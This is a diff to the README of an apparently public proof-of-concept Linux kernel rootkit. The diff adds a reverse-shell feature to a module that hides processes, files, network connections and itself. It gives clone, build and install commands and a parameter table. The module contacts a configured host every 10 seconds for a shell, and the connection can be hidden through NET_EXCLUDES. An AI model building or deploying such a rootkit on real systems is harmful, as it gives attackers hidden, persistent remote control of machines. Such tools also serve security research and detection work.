@@ -9,7 +9,7 @@
 ```
 
 
-A simple proof-of-concept Linux Kernel Rootkit module designed to hide processes, files, network connections and itself from userland visibility for modern kernel versions.  
+A simple proof-of-concept Linux Kernel Rootkit module designed to hide processes, files, network connections and itself from userland visibility, and offers the ability the establish a reverse shell, for modern kernel versions.
 
 This module operates at the kernel level, allowing it to intercept system calls directly, enabling a higher degree of stealth compared to user-space techniques (i.e `LD_PRELOAD`).
 
@@ -24,10 +24,13 @@ Unlike traditional rootkits that rely on direct syscall table hooking or exporte
 - **Network connection hiding** – Hide files and folders based on configured IP addresses or ports
 - **Module Hiding** – Hides itself from kernel module listings
 
-Demo - before and after loading the module:
+### Demo - hiding names and processes, before and after loading the module:
 
-<img width="446" alt="image" src="https://github.com/user-attachments/assets/391053e8-06c7-47aa-9301-043b5590e619" />
+<img width="437" alt="image" src="https://github.com/user-attachments/assets/855ae402-1cbd-4f5c-97d4-c83573f18a75" />
 
+### Demo - Establishing a hidden reverse shell and hiding network connections
+
+<img width="437" alt="image" src="https://github.com/user-attachments/assets/c6fdb061-8fb6-4456-91a0-61037c303752" />
 
 ## Requirements
 
@@ -43,7 +46,8 @@ Tested on x86_64 Linux only
 ```bash
 git clone https://github.com/flashnuke/mod-rootkit.git
 cd mod-rootkit
-make STRING_EXCLUDES="SOME_FILENAME1,SOME_FILENAME2" NET_EXCLUDES="127.0.0.1,2222" HIDE_MODULE=0
+make STRING_EXCLUDES="SOME_FILENAME1,SOME_FILENAME2" NET_EXCLUDES="127.0.0.1,2222" RSHELL_HOST=192.168.1.1 RSHELL_PORT=9001 HIDE_MODULE=0
+# to add a reverse shell read params breakdown
 sudo make install
 make clean
 ```
@@ -55,6 +59,10 @@ To compile the module:
 ```bash
 make STRING_EXCLUDES="SOME_FILENAME1,SOME_FILENAME2" NET_EXCLUDES="127.0.0.1,2222" HIDE_MODULE=0
 ```
+You can also set up a reverse shell:
+```bash
+make RSHELL_HOST=192.168.1.1 RSHELL_PORT=9001 NET_EXCLUDES=9001 # NET_EXCLUDES is used to hide the connection, it's not mandatory
+```
 
 | Parameter        | Required? | Description                                                                 |
 |------------------|-----------|-----------------------------------------------------------------------------|
@@ -62,12 +70,15 @@ make STRING_EXCLUDES="SOME_FILENAME1,SOME_FILENAME2" NET_EXCLUDES="127.0.0.1,222
 | `NET_EXCLUDES`   | No        | Comma-separated list of IPs/ports to ignore or hide connections                   |
 | `HIDE_MODULE`    | No        | Set to `1` to auto-hide the module after load (hides from `lsmod`, etc.)  |
 | `MODULE_NAME`    | No        | Default is `mod_rootkit`, override to change the module name                |
+| `RSHELL_HOST`    | No        | IP address of the reverse shell host                |
+| `RSHELL_PORT`    | No        | Port address of the reverse shell host                |
 
 Notes
 * When hiding a process - make sure its cmdline contains a substr that is then passed via `STRING_EXCLUDES`, ie: running "`./HIDEME.sh`" and then passing `make ... STRING_EXCLUDES=HIDEME ...`
 * For every str inside the `*_EXCLUDES` params, it's enough for a partial match in order for an entry to be hidden (doesn't have to be a full match, i.e: `STRING_EXCLUDES=ABC` would hide entry `...ABCDE...`)
 * Setting `HIDE_MODULE=1` hides the module, use with caution as it's not trivial to remove it afterwards
 * `NET_EXCLUDES` example - `NET_EXCLUDES=127.0.0.1,12345` would exclude all connections to/from `127.0.0.1` and all connections to/from port `12345`
+* If reverse shell params are set, the module attempts to establish a reverse shell connection to the host every 10 seconds. 
 
 ### Loading / removing the module manually
 To load:
